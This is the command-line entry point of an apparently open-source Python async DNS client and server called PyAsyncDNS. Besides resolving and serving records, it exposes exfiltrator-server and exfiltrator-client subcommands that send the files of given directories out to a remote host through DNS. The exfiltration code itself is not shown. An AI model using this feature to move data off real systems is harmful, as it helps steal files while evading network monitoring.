#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements a basic asynchronous DNS client and server
#    with a feature to exfiltrate data through DNS.
#    Copyright (C) 2025, 2026  PyAsyncDNS

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
PyAsyncDNS - Async DNS client/server - CLI entry point.

Subcommands:
  resolve  <name> [type] [--server IP] [--port N] [--tcp] [--udp]
  server   <host> <port> --zone zone.json
  exfiltrator-server <host> <port>
  exfiltrator-client <host> <port> <dir...>
"""

__version__ = "1.0.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements a basic asynchronous DNS client and server
with a feature to exfiltrate data through DNS.
"""
__url__ = "https://github.com/mauricelambert/PyAsyncDNS"

__all__ = ["cmd_resolve", "cmd_server", "main"]

__license__ = "GPL-3.0 License"
__copyright__ = """
PyAsyncDNS  Copyright (C) 2025, 2026  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
copyright = __copyright__
license = __license__

from asyncio import run
from typing import Optional, List
from sys import exit, stderr, argv, executable

if __package__:
    from .datatypes import (
        ARecord,
        AAAARecord,
        CNAMERecord,
        NSRecord,
        PTRRecord,
        MXRecord,
        TXTRecord,
        SRVRecord,
        SOARecord,
        CAARecord,
        RecordType,
    )
    from .client import (
        resolve_a,
        resolve_aaaa,
        resolve_mx,
        resolve_ns,
        resolve_txt,
        resolve_srv,
        resolve_ptr,
        resolve_soa,
        resolve_caa,
        resolve_any,
        resolve,
        query_udp,
        query_tcp, query,
    )
    from .exfiltrator_client import process_directories
    from .exfiltrator_server import start_exfiltrator_server
    from .server import Zone, DNSServer
else:
    from datatypes import (
        ARecord,
        AAAARecord,
        CNAMERecord,
        NSRecord,
        PTRRecord,
        MXRecord,
        TXTRecord,
        SRVRecord,
        SOARecord,
        CAARecord,
        RecordType,
    )
    from client import (
        resolve_a,
        resolve_aaaa,
        resolve_mx,
        resolve_ns,
        resolve_txt,
        resolve_srv,
        resolve_ptr,
        resolve_soa,
        resolve_caa,
        resolve_any,
        resolve,
        query_udp,
        query_tcp, query,
    )
    from exfiltrator_client import process_directories
    from exfiltrator_server import start_exfiltrator_server
    from server import Zone, DNSServer


_TYPE_MAP = {
    "A": RecordType.A,
    "AAAA": RecordType.AAAA,
    "CNAME": RecordType.CNAME,
    "MX": RecordType.MX,
    "NS": RecordType.NS,
    "TXT": RecordType.TXT,
    "SRV": RecordType.SRV,
    "PTR": RecordType.PTR,
    "SOA": RecordType.SOA,
    "CAA": RecordType.CAA,
    "ANY": RecordType.ANY,
}


def print_usage():
    """
    This function prints the usages message.
    """

    print(f"""
PyAsyncDNS - Pure Python async DNS client/server

Usage:
  {executable} {argv[0]} resolve <name> [TYPE] [--server IP] [--port N] [--udp|--tcp]
  {executable} {argv[0]} server <host> <port> --zone <zone.json>
  {executable} {argv[0]} exfiltrator-server <host> <port>
  {executable} {argv[0]} exfiltrator-client <host> <port> <dir...>

Record types: A AAAA CNAME MX NS TXT SRV PTR SOA CAA ANY
Default type: A
Default server: 8.8.8.8:53

Examples:
  {executable} {argv[0]} resolve example.com
  {executable} {argv[0]} resolve example.com MX
  {executable} {argv[0]} resolve example.com TXT --server 1.1.1.1
  {executable} {argv[0]} resolve 8.8.8.8 PTR
  {executable} {argv[0]} resolve example.com A --tcp
  {executable} {argv[0]} server 0.0.0.0 5353 --zone zone_example.json
""", file=stderr)


async def cmd_resolve(args: List[str]):
    """
    This function parses arguments and start the code
    for the resolve subcommand.
    """

    if not args:
        print("Error: missing domain name", file=stderr)
        return 1

    name = args[0]
    qtype_str = "A"
    server = "8.8.8.8"
    port = 53
    force_udp = False
    force_tcp = False

    i = 1
    while i < len(args):
        a = args[i]
        if a.upper() in _TYPE_MAP:
            qtype_str = a.upper()
        elif a == "--server" and i + 1 < len(args):
            server = args[i + 1]; i += 1
        elif a == "--port" and i + 1 < len(args):
            port = int(args[i + 1]); i += 1
        elif a == "--udp":
            force_udp = True
        elif a == "--tcp":
            force_tcp = True
        i += 1

    qtype = _TYPE_MAP[qtype_str]

    print(f"Querying {name} {qtype_str} @{server}:{port}", end="")
    if force_tcp:
        print(" [forced TCP]")
        msg = await query_tcp(name, qtype, server, port)
    elif force_udp:
        print(" [forced UDP]")
        msg = await query_udp(name, qtype, server, port)
    else:
        print(" [auto]")
        msg = await query(name, qtype, server, port)

    if not msg.answers:
        rcode = msg.header.flags.rcode
        print(f"  No answers. RCODE={rcode}")
        return 0

    for rr in msg.answers:
        rtype_name = RecordType(rr.rtype).name if rr.rtype in RecordType._value2member_map_ else str(rr.rtype)
        print(f"  {rr.name:<40} {rr.ttl:<8} {rtype_name:<8} {_format_rdata(rr.rdata)}")
    return 0


def _format_rdata(rdata) -> str:
    if rdata is None:
        return "(empty)"

    if isinstance(rdata, (ARecord, AAAARecord)):
        return rdata.address
    if isinstance(rdata, CNAMERecord):
        return f"-> {rdata.target}"
    if isinstance(rdata, NSRecord):
        return rdata.nameserver
    if isinstance(rdata, PTRRecord):
        return rdata.ptrdname
    if isinstance(rdata, MXRecord):
        return f"pref={rdata.preference} {rdata.exchange}"
    if isinstance(rdata, TXTRecord):
        return " | ".join(s.decode("utf-8", errors="replace") for s in rdata.strings)
    if isinstance(rdata, SRVRecord):
        return f"prio={rdata.priority} w={rdata.weight} port={rdata.port} {rdata.target}"
    if isinstance(rdata, SOARecord):
        return (f"{rdata.mname} {rdata.rname} serial={rdata.serial} "
                f"refresh={rdata.refresh} retry={rdata.retry} "
                f"expire={rdata.expire} min={rdata.minimum}")
    if isinstance(rdata, CAARecord):
        return f"flags={rdata.flags} {rdata.tag}=\"{rdata.value}\""
    if isinstance(rdata, bytes):
        return rdata.hex()
    return str(rdata)


async def cmd_server(args: List[str]) -> int:
    """
    This function parses arguments and start the code
    for the server subcommand.
    """

    if len(args) < 2:
        print("Usage: server <host> <port> [--zone file.json]", file=stderr)
        return 1

    host = args[0]
    port = int(args[1])
    zone = None
    i = 2
    while i < len(args):
        if args[i] == "--zone" and i + 1 < len(args):
            zone = Zone.from_json(args[i + 1])
            print(f"Loaded zone from {args[i+1]}")
            i += 1
        i += 1

    server = DNSServer(zone=zone, host=host, port=port)
    try:
        await server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
    return 0


def main() -> int:
    """
    The main function to run the package from the command line.
    """

    print(copyright)

    args = argv[1:]
    if not args or args[0] in ("-h", "--help"):
        print_usage()
        return 0

    cmd = args[0]
    rest = args[1:]

    if cmd == "resolve":
        return run(cmd_resolve(rest))
    elif cmd == "server":
        return run(cmd_server(rest))
    elif cmd == "exfiltrator-server":
        if len(rest) < 2:
            print("Usage: exfiltrator-server <host> <port>", file=stderr)
            return 1
        run(start_exfiltrator_server(rest[0], int(rest[1])))
        return 0
    elif cmd == "exfiltrator-client":
        if len(rest) < 3:
            print("Usage: exfiltrator-client <host> <port> <dir...>", file=stderr)
            return 1
        run(process_directories(rest[2:], rest[0], int(rest[1])))
        return 0
    else:
        print("Unknown command: ", cmd, file=stderr)
        print_usage()
        return 1


if __name__ == "__main__":
    exit(main())
